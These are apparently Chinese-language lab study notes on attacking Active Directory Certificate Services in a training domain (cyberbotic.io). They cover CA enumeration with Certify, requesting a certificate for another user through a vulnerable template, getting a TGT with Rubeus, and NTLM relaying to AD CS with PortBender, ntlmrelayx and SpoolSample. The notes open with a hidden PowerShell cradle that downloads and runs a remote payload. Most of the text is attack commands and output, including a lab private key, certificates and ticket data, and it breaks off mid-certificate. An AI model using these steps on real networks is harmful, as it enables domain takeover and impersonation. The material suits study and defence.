powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/a'))"
# Finding Certificate Authorities

枚举域证书信息 


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660484464732.png)

```
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe cas
[*] Tasked beacon to run .NET program: Certify.exe cas
[+] host called home, sent: 279617 bytes
[+] received output:

   _____          _   _  __              
  / ____|        | | (_)/ _|             
 | |     ___ _ __| |_ _| |_ _   _        
 | |    / _ \ '__| __| |  _| | | |      
 | |___|  __/ |  | |_| | | | |_| |       
  \_____\___|_|   \__|_|_|  \__, |   
                             __/ |       
                            |___./        
  v1.0.0                               

[*] Action: Find certificate authorities
[*] Using the search base 'CN=Configuration,DC=cyberbotic,DC=io'


[*] Root CAs

    Cert SubjectName              : CN=ca-1, DC=cyberbotic, DC=io
    Cert Thumbprint               : 7F8A1EFB7A50E2D1DE098085301926AA13AE0A71
    Cert Serial                   : 31AC83C6678F28994CFB58207C9FB668
    Cert Start Date               : 2/25/2022 11:29:14 AM
    Cert End Date                 : 2/25/2047 11:39:08 AM
    Cert Chain                    : CN=ca-1,DC=cyberbotic,DC=io



[*] Enterprise/Enrollment CAs:

    Enterprise CA Name            : ca-1
    DNS Hostname                  : dc-1.cyberbotic.io
    FullName                      : dc-1.cyberbotic.io\ca-1
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=ca-1, DC=cyberbotic, DC=io
    Cert Thumbprint               : 7F8A1EFB7A50E2D1DE098085301926AA13AE0A71
    Cert Serial                   : 31AC83C6678F28994CFB58207C9FB668
    Cert Start Date               : 2/25/2022 11:29:14 AM
    Cert End Date                 : 2/25/2047 11:39:08 AM
    Cert Chain                    : CN=ca-1,DC=cyberbotic,DC=io
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               CYBER\Domain Admins           S-1-5-21-378720957-2217973887-3501892633-512
      Allow  ManageCA, ManageCertificates               CYBER\Enterprise Admins       S-1-5-21-378720957-2217973887-3501892633-519
    Enrollment Agent Restrictions : None

....


    Enterprise CA Name            : ca-2
    DNS Hostname                  : dc-2.dev.cyberbotic.io
    FullName                      : dc-2.dev.cyberbotic.io\ca-2
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=ca-2, DC=dev, DC=cyberbotic, DC=io
    Cert Thumbprint               : 2D0349C77D35808E35A7C6815CF37B51D9A5D431
    Cert Serial                   : 64000000067ED180604220703C000000000006
    Cert Start Date               : 3/1/2022 10:45:07 AM
    Cert End Date                 : 3/1/2024 10:55:07 AM
    Cert Chain                    : CN=ca-1,DC=cyberbotic,DC=io -> CN=ca-2,DC=dev,DC=cyberbotic,DC=io
    UserSpecifiedSAN              : Could not connect to the HKLM hive - The network path was not found.

    CA Permissions                :



Certify completed in 00:00:07.9411960

```


# Misconfigured Certificate Templates

使用[Certify](https://github.com/GhostPack/Certify)工具查找任何易受攻击的模板

```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable
```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660484646273.png)

```
[+] received output:

[!] Vulnerable Certificates Templates :

    CA Name                               : dc-1.cyberbotic.io\ca-1
    Template Name                         : VulnerableUserTemplate
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : CYBER\Domain Admins           S-1-5-21-378720957-2217973887-3501892633-512
                                      CYBER\Domain Users            S-1-5-21-378720957-2217973887-3501892633-513
                                      CYBER\Enterprise Admins       S-1-5-21-378720957-2217973887-3501892633-519
      Object Control Permissions
        Owner                       : CYBER\Administrator           S-1-5-21-378720957-2217973887-3501892633-500
        WriteOwner Principals       : CYBER\Administrator           S-1-5-21-378720957-2217973887-3501892633-500
                                      CYBER\Domain Admins           S-1-5-21-378720957-2217973887-3501892633-512
                                      CYBER\Enterprise Admins       S-1-5-21-378720957-2217973887-3501892633-519
        WriteDacl Principals        : CYBER\Administrator           S-1-5-21-378720957-2217973887-3501892633-500
                                      CYBER\Domain Admins           S-1-5-21-378720957-2217973887-3501892633-512
                                      CYBER\Enterprise Admins       S-1-5-21-378720957-2217973887-3501892633-519
        WriteProperty Principals    : CYBER\Administrator           S-1-5-21-378720957-2217973887-3501892633-500
                                      CYBER\Domain Admins           S-1-5-21-378720957-2217973887-3501892633-512
                                      CYBER\Enterprise Admins       S-1-5-21-378720957-2217973887-3501892633-519



Certify completed in 00:00:00.9969350

```


生成证书
```
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-1.cyberbotic.io\ca-1 /template:VulnerableUserTemplate /altname:nglover
```

```
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-1.cyberbotic.io\ca-1 /template:VulnerableUserTemplate /altname:nglover
[*] Tasked beacon to run .NET program: Certify.exe request /ca:dc-1.cyberbotic.io\ca-1 /template:VulnerableUserTemplate /altname:nglover
[+] host called home, sent: 279765 bytes
[+] received output:

   _____          _   _  __              
  / ____|        | | (_)/ _|             
 | |     ___ _ __| |_ _| |_ _   _        
 | |    / _ \ '__| __| |  _| | | |      
 | |___|  __/ |  | |_| | | | |_| |       
  \_____\___|_|   \__|_|_|  \__, |   
                             __/ |       
                            |___./        
  v1.0.0                               

[*] Action: Request a Certificates

[*] Current user context    : CYBER\iyates
[*] No subject name specified, using current context as subject.

[*] Template                : VulnerableUserTemplate
[*] Subject                 : CN=Isabel Yates, CN=Users, DC=cyberbotic, DC=io
[*] AltName                 : nglover

[+] received output:

[*] Certificate Authority   : dc-1.cyberbotic.io\ca-1

[+] received output:

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 8

[+] received output:

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAxhcCxbwqy9c8HKgEW1QFIivFTJxU4ML93+lcU+xluV0cwnkw
8oa8MuNlyEZmGGcJLJB4LVmx9f2C084nlKf6dZ3ybLVx+sxlsNsyso2QZKsVZg8d
ysqDgyr9aTtjwkePoqIXSzznsC79cVYKAnvINYKQNQoicU0PZPW11SNcQmdRzWeY
CNLRkVCOT2dnwHt7HszAhwFuAZ1pgA+IETIPR2UZTCToF9sUCTURDZh+p1BT4onb
OFiasyzw5Xvxt5KetTk2n8sfQ7Fk3fDQLuC8q9Pfeu4Jyunm6VH0OhAq+sRBgpSy
IFR5NSpl0AoA7cP0em6z4u2dz3EqPIKTYn2KowIDAQABAoIBABVUiv7h2TXj8lwf
l4CCFp9sWS17tAQT2ySOS1vaG8YPCbbDOAsViRRtuhsLwZilF67Ny7MOcoRLjRfj
ng163RRnMqCUFTbtZZHauKXTapX8eixoOkwI7IpmSa1YMNDNxeC8VYfLgiNNnArl
OeS0kYV5jq+3bKgIpTy43KCb0yZvKymtLcrxVjElP04g+ANe8FHvLfwTzH1AyueY
A1ITdeXFI3hvgYKn92nw4Pza7ZNl48WWfKyCK8OcCIjDp61ohswHG8Lpo1DppX8Z
hH1Iz4QpkBctjrnrkTjlBGhBu3xVT+CqdaSIE+5Z3fFGJhK8LlxIbc+f/pY9CpxN
ZIPF2vECgYEA1tgpyhlhnIXmg05Xb9HvuF7QmzvyxUq+cWD37vdlAtee19tWt3QE
MTHa65XbNfi5ScZHYh20RI/tgsVXKtnIkJ4NJ2zQ0PSpQq8y5n4L2ZWn4JJS9X8Z
Gg/JKiB2b1Q2Q5W8xwGTgXq/F94gFTsRQR+sFIoRXlWd7ct5rYEzQ9sCgYEA7Ak3
lY7VnUjQSe3vWeatADTGkaPxAD8dEW2YtSORMa8J3Y1IcTSZinCbl0Z6xji2Vuz7
iz4ERtZQSxcao8j+5tsjgYEQyerf/1SdD8mrd5C+545maPJ1BENFMj0Sy6VdaR8l
ZJKX4u0tObvug+FW/cawaJF+ig0L+jBkB67s8tkCgYA28w6tLBS1LeIpT045wV4o
r8d3DLwpDdbrtLt1GT1ynqd32hex0DCKTJALlUZ95WGuptH3HFXQ+2bp/YMv6IfN
xT7kCIbYCtuHvLuuDCsHuak4XPRu6dUHv2XaKndgPg+q9Y9U7uhFQ5nAhwV5qKPf
HjSrBC0xDYDZIyO55sOv5QKBgFTBdokosgH5fHmfi7v/fg295bO0Z7zL7PcuIJCi
xedOUD+TFPk5hwzUJLqsXzfAc5FBJY45ZbW+DTT5heJcMVPaSqSdINcwlOCNlJxv
sTeM7VAerR1wOp6ePUGt9orTxXgS7A1yKkIdIolBt4L5rpAQAZZ68DJIPw3GxJSR
tpn5AoGAcQm/0K3r6jIYwjyz8L7gS2tdNWpgDuU0kaqX0lmgn3iGUbAvObOo4D24
kNEcaF57d+C+hSMpDlB5/MZWCdax2rEoq8DqJTS2sOsHxWAFvkUZL6hMu6Z4Mug2
S5V9kgmIZjuGPciu9NM8KG8ZngOvW4x5rYE84y/PUsoyNdevecc=
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGATCCBOmgAwIBAgITZAAAAAj35a/4E7TaTQAAAAAACDANBgkqhkiG9w0BAQsF
ADA/MRIwEAYKCZImiZPyLGQBGRYCaW8xGjAYBgoJkiaJk/IsZAEZFgpjeWJlcmJv
dGljMQ0wCwYDVQQDEwRjYS0xMB4XDTIyMDgxNDEzMzYzNFoXDTIzMDgxNDEzMzYz
NFowVzESMBAGCgmSJomT8ixkARkWAmlvMRowGAYKCZImiZPyLGQBGRYKY3liZXJi
b3RpYzEOMAwGA1UEAxMFVXNlcnMxFTATBgNVBAMTDElzYWJlbCBZYXRlczCCASIw
DQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMYXAsW8KsvXPByoBFtUBSIrxUyc
VODC/d/pXFPsZbldHMJ5MPKGvDLjZchGZhhnCSyQeC1ZsfX9gtPOJ5Sn+nWd8my1
cfrMZbDbMrKNkGSrFWYPHcrKg4Mq/Wk7Y8JHj6KiF0s857Au/XFWCgJ7yDWCkDUK
InFND2T1tdUjXEJnUc1nmAjS0ZFQjk9nZ8B7ex7MwIcBbgGdaYAPiBEyD0dlGUwk
6BfbFAk1EQ2YfqdQU+KJ2zhYmrMs8OV78beSnrU5Np/LH0OxZN3w0C7gvKvT33ru
Ccrp5ulR9DoQKvrEQYKUsiBUeTUqZdAKAO3D9Hpus+Ltnc9xKjyCk2J9iqMCAwEA
AaOCAtwwggLYMDsGCSsGAQQBgjcVBwQuMCwGJCsGAQQBgjcVCIbIihb8ojyEoYc8
gvSPaMfvbFaFy4RIhvjECgIBZAIBAzApBgNVHSUEIjAgBggrBgEFBQcDAgYIKwYB
BQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcVCgQo
MCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkqhkiG
9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYFKw4D
AgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFIBbzEYJ9gva21tK5IaQJZoczIhOMCIG
A1UdEQQbMBmgFwYKKwYBBAGCNxQCA6AJDAduZ2xvdmVyMB8GA1UdIwQYMBaAFK95
L8P8RbqLPv3ppNZfgCqo92odMIHBBgNVHR8EgbkwgbYwgbOggbCgga2GgapsZGFw
Oi8vL0NOPWNhLTEsQ049ZGMtMSxDTj1DRFAsQ049UHVibGljJTIwS2V5JTIwU2Vy
dmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1jeWJlcmJvdGlj
LERDPWlvP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RDbGFz
cz1jUkxEaXN0cmlidXRpb25Qb2ludDCBuAYIKwYBBQUHAQEEgaswgagwgaUGCCsG
AQUFBzAChoGYbGRhcDovLy9DTj1jYS0xLENOPUFJQSxDTj1QdWJsaWMlMjBLZXkl
MjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPWN5YmVy
Ym90aWMsREM9aW8/Y0FDZXJ0aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRp
ZmljYXRpb25BdXRob3JpdHkwDQYJKoZIhvcNAQELBQADggEBAIALFOR5LVa2IKYo
HLhbNAlUtRJnBduhyBOjsqsmaV7+9BeAnskvV7ff/b55Qrju3AhjEFaYlOHuvS1i
CO3qLFzzUncuCFSF4GjChSrbteHhGSrZpftm2BdRWb7oVebLzYLGorSYjDEREBnM
Ng3ow6Ld04kPIXrT9VU2doVVGd6SA1r+aq1T8o/P5Uuv6jpPu63ktf0Q2IOZePY5
AHvKmMwGKRxQZXRLfWx8AC70jXL29QUOuvOjY9zSM6KAZXIFa7KR6xyKiZDKAXiI
fCDqDDzbuH8q+GwtgMrisk0OFMY0j1SG2Rx4qYlQK4g3nOcCznsLIkPAt7A8d6fS
UlykRQk=
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx



Certify completed in 00:00:15.2736817

```

复制上面证书内容到cert.pem，然后openssl输出成cert.pfx
```
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660484985024.png)


使用bases64输出证书
```
root@kali:~/Desktop# cat cert.pfx | base64 -w 0

MIIMtwIBAzCC......AgIIAA==

root@kali:~/Desktop#
```


使用上面证书生成tgt，**注意**，这里指定的**/password**参数是上面生成证书时输入的密码



![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660485863234.png)

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:nglover /certificate:MIIMtwIBAzCC......AgIIAA== /password:123 /aes256 /nowrap

[*] Tasked beacon to run .NET program: Rubeus.exe asktgt /user:nglover /certificate:MIIMtwIBAzCC......AgIIAA== /password:123 /aes256 /nowrap
[+] host called home, sent: 594083 bytes
[+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.1 

[*] Action: Ask TGT


[+] received output:
[*] Using PKINIT with etype rc4_hmac and subject: CN=Isabel Yates, CN=Users, DC=cyberbotic, DC=io 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'cyberbotic.io\nglover'

[+] received output:
[*] Using domain controller: 10.10.15.75:88

[+] received output:
[+] TGT request successful!

[+] received output:
[*] base64(ticket.kirbi):

      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

  ServiceName              :  krbtgt/cyberbotic.io
  ServiceRealm             :  CYBERBOTIC.IO
  UserName                 :  nglover
  UserRealm                :  CYBERBOTIC.IO
  StartTime                :  8/14/2022 2:00:00 PM
  EndTime                  :  8/15/2022 12:00:00 AM
  RenewTill                :  8/21/2022 2:00:00 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  wyDald3/L7j0qZ/Bd7vVqA==
  ASREP (key)              :  92E1616B29013121E4004AB70FF7D03F



```


拿到tgt,制作票据
```
[IO.File]::WriteAllBytes("C:\Users\Administrator\desktop\nglover.kirbi", [Convert]::FromBase64String("doIGDjC...WJlcmJvdGljLmlv"))
```


导入ticket，访问dc-1


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660486344943.png)

# NTLM Relaying to ADCS HTTP Endpoints

1. 在srv-1上转发端口


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660521756280.png)

```
beacon> getuid
[*] Tasked beacon to get userid
[+] host called home, sent: 8 bytes
[*] You are NT AUTHORITY\SYSTEM (admin)
beacon> PortBender redirect 445 8445
[+] Launching PortBender module using reflective DLL injection

[*] Tasked beacon to spawn PortBender
[+] host called home, sent: 53812 bytes
[+] received output:
 _______                        __      _______                             __                           
/       \                      /  |    /       \                           /  |                        
$$$$$$$  | ______    ______   _$$ |_   $$$$$$$  |  ______   _______    ____$$ |  ______    ______        
$$ |__$$ |/      \  /      \ / $$   |  $$ |__$$ | /      \ /       \  /    $$ | /      \  /      \ 
$$    $$//$$$$$$  |/$$$$$$  |$$$$$$/   $$    $$< /$$$$$$  |$$$$$$$  |/$$$$$$$ |/$$$$$$  |/$$$$$$  |      
$$$$$$$/ $$ |  $$ |$$ |  $$/   $$ | __ $$$$$$$  |$$    $$ |$$ |  $$ |$$ |  $$ |$$    $$ |$$ |  $$/       
$$ |     $$ \__$$ |$$ |        $$ |/  |$$ |__$$ |$$$$$$$$/ $$ |  $$ |$$ \__$$ |$$$$$$$$/ $$ |          
$$ |     $$    $$/ $$ |        $$  $$/ $$    $$/ $$       |$$ |  $$ |$$    $$ |$$       |$$ |            
$$/       $$$$$$/  $$/          $$$$/  $$$$$$$/   $$$$$$$/ $$/   $$/  $$$$$$$/  $$$$$$$/ $$/             
                                                                                                         
Initializing PortBender in redirector mode
Configuring redirection of connections targeting 445/TCP to 8445/TCP

beacon> rportfwd 8445 127.0.0.1 445
[+] started reverse port forward on 8445 to 127.0.0.1:445
[*] Tasked beacon to forward port 8445 to 127.0.0.1:445
[+] host called home, sent: 10 bytes
beacon> socks 1080
[+] started SOCKS4a server on: 1080
```


2. kali开启ntlmrelayx，10.10.15.75是dc-1的ip

```
proxychains ntlmrelayx.py -t http://10.10.15.75/certsrv/certfnsh.asp -smb2support --adcs --no-http-server
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660521808537.png)


3. 利用SpoolSample.exe,强制10.10.15.254向10.10.17.25认证

```
execute-assembly C:\Tools\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe 10.10.15.254（WKSTN-3） 10.10.17.25（SRV-1）
```


4. kali收到tgt


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1660522044250.png)

```
[*] GOT CERTIFICATE! ID 9
[*] Base64 certificate of user WKSTN-3$: 
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